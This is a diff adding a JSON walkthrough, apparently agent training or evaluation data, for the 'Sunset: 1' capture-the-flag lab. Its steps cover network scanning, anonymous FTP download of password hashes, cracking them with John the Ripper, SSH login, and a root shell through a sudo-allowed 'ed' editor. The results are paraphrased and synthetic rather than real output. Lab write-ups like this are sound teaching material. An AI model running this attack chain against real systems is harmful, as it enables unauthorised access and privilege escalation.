@@ -1,0 +1,131 @@
+{
+    "initial_prompt": "The primary objective is to identify and capture flags while escalating privileges to gain root access on the Sunset: 1 target system (IP: 192.168.1.153). The attacker operates from a Kali Linux 2024 machine. This beginner-friendly CTF challenge involves network scanning, service enumeration, credential cracking, and privilege escalation to retrieve user and root flags.",
+    "steps": [
+        {
+            "step_number": 1,
+            "thought": "Identify the IP address of the target machine 'Sunset: 1' on the local network. The IP is stated as 192.168.1.153, this step shows how it could be found.",
+            "command": "sudo netdiscover",
+            "result": "The `netdiscover` command scans the local network. Output lists active hosts, among which the target machine 'Sunset: 1' is identified with IP address 192.168.1.153."
+        },
+        {
+            "step_number": 2,
+            "thought": "Perform an aggressive scan on the target IP 192.168.1.153 to discover open ports, services, versions, and OS information.",
+            "command": "nmap -A 192.168.1.153",
+            "result": "Nmap scan completed. Output shows port 21 (FTP) is open, running vsftpd, and allows anonymous FTP login. Port 22 (SSH) is open, running OpenSSH. OS and service version details are also provided."
+        },
+        {
+            "step_number": 3,
+            "thought": "Connect to the FTP service on the target machine to explore accessible files.",
+            "command": "ftp 192.168.1.153",
+            "result": "Connected to 192.168.1.153. FTP server responds (e.g., '220 (vsFTPd 3.0.3)'). Prompted for 'Name (192.168.1.153:kali):'. Entered 'anonymous'. Prompted for 'Password:'. Entered a blank password. Login successful (e.g., '230 Login successful.'). FTP prompt 'ftp>' is displayed."
+        },
+        {
+            "step_number": 4,
+            "thought": "List files and directories in the current directory on the FTP server.",
+            "command": "ls",
+            "result": "Output from FTP server lists contents. A file named 'backup' is visible in the directory listing."
+        },
+        {
+            "step_number": 5,
+            "thought": "Download the 'backup' file from the FTP server to the attacker's Kali machine.",
+            "command": "get backup",
+            "result": "FTP server transfers 'backup'. Output indicates successful transfer (e.g., '200 PORT command successful. Consider using PASV.', '150 Opening BINARY mode data connection for backup (size bytes).', '226 Transfer complete.'). The file 'backup' is now on the local system."
+        },
+        {
+            "step_number": 6,
+            "thought": "Exit the FTP session.",
+            "command": "bye",
+            "result": "Disconnected from FTP server (e.g., '221 Goodbye.'). Returned to the Kali shell prompt."
+        },
+        {
+            "step_number": 7,
+            "thought": "Display the content of the downloaded 'backup' file to inspect it for credentials or hashes.",
+            "command": "cat backup",
+            "result": "The content of the 'backup' file is displayed on the terminal. It contains several user hashes, including one for a user named 'sunset'."
+        },
+        {
+            "step_number": 8,
+            "thought": "Create a new file named 'hash' containing the hashes from the 'backup' file for use with John the Ripper.",
+            "command": "cat backup > hash",
+            "result": "The content of 'backup' is redirected and saved into a new file named 'hash'. This file will be used as input for password cracking."
+        },
+        {
+            "step_number": 9,
+            "thought": "Ensure the 'rockyou.txt' wordlist is available and decompressed for password cracking. (Path: /usr/share/wordlists/rockyou.txt)",
+            "command": "if [ -f /usr/share/wordlists/rockyou.txt.gz ] && [ ! -f /usr/share/wordlists/rockyou.txt ]; then sudo gunzip /usr/share/wordlists/rockyou.txt.gz; fi",
+            "result": "Command checks for 'rockyou.txt.gz'. If it exists and 'rockyou.txt' does not, 'rockyou.txt.gz' is decompressed. If 'rockyou.txt' already exists or '.gz' is not found, no changes are made by this specific logic, or an error might occur if gunzip target doesn't exist."
+        },
+        {
+            "step_number": 10,
+            "thought": "Attempt to crack the hashes in the 'hash' file using John the Ripper with the 'rockyou.txt' wordlist.",
+            "command": "john --wordlist=/usr/share/wordlists/rockyou.txt hash",
+            "result": "John the Ripper begins processing the 'hash' file. After some time, it may output cracked passwords. For user 'sunset', the password 'cheer14' is expected to be found."
+        },
+        {
+            "step_number": 11,
+            "thought": "Display the cracked passwords found by John the Ripper.",
+            "command": "john --show hash",
+            "result": "John the Ripper displays the cracked credentials from its .pot file associated with 'hash'. The output confirms 'sunset:cheer14'."
+        },
+        {
+            "step_number": 12,
+            "thought": "Log into the target machine via SSH as user 'sunset' using the cracked password 'cheer14'.",
+            "command": "ssh sunset@192.168.1.153",
+            "result": "SSH connection initiated. Prompted for 'sunset@192.168.1.153's password:'. Entered 'cheer14'. Authentication successful. A shell session as the 'sunset' user on the target machine is established."
+        },
+        {
+            "step_number": 13,
+            "thought": "List files in the 'sunset' user's home directory on the target machine to find the user flag.",
+            "command": "ls",
+            "result": "Output lists files and directories in '/home/sunset'. A file named 'user.txt' is visible."
+        },
+        {
+            "step_number": 14,
+            "thought": "Display the content of 'user.txt' to retrieve the user flag.",
+            "command": "cat user.txt",
+            "result": "The content of 'user.txt' is displayed, revealing the user flag (e.g., a hash or specific text string)."
+        },
+        {
+            "step_number": 15,
+            "thought": "Check the sudo privileges available to the 'sunset' user to identify potential privilege escalation vectors.",
+            "command": "sudo -l",
+            "result": "Output lists the sudo permissions for 'sunset'. It shows that the user 'sunset' can run '/usr/bin/ed' as root without a password: '(root) NOPASSWD: /usr/bin/ed'."
+        },
+        {
+            "step_number": 16,
+            "thought": "Launch the 'ed' text editor with root privileges using the discovered sudo permission.",
+            "command": "sudo /usr/bin/ed",
+            "result": "The 'ed' text editor is launched with root privileges. No explicit prompt is usually shown by 'ed' itself, it awaits input."
+        },
+        {
+            "step_number": 17,
+            "thought": "Within the 'ed' editor (running as root), execute a shell command to spawn a root shell.",
+            "command": "!/bin/sh",
+            "result": "This command, entered into the 'ed' editor, executes '/bin/sh'. A root shell is spawned, indicated by the prompt changing (e.g., to '#')."
+        },
+        {
+            "step_number": 18,
+            "thought": "Verify that privileges have been escalated to root.",
+            "command": "whoami",
+            "result": "Output displays 'root', confirming successful privilege escalation."
+        },
+        {
+            "step_number": 19,
+            "thought": "Navigate to the root user's home directory to find the root flag.",
+            "command": "cd /root",
+            "result": "The current directory is changed to '/root'."
+        },
+        {
+            "step_number": 20,
+            "thought": "List files in the '/root' directory.",
+            "command": "ls",
+            "result": "Output lists files and directories in '/root'. A file named 'flag.txt' (or similar, like 'root.txt') is visible."
+        },
+        {
+            "step_number": 21,
+            "thought": "Display the content of 'flag.txt' to retrieve the final root flag.",
+            "command": "cat flag.txt",
+            "result": "The content of 'flag.txt' is displayed, revealing the root flag. This completes the CTF challenge."
+        }
+    ]
+}
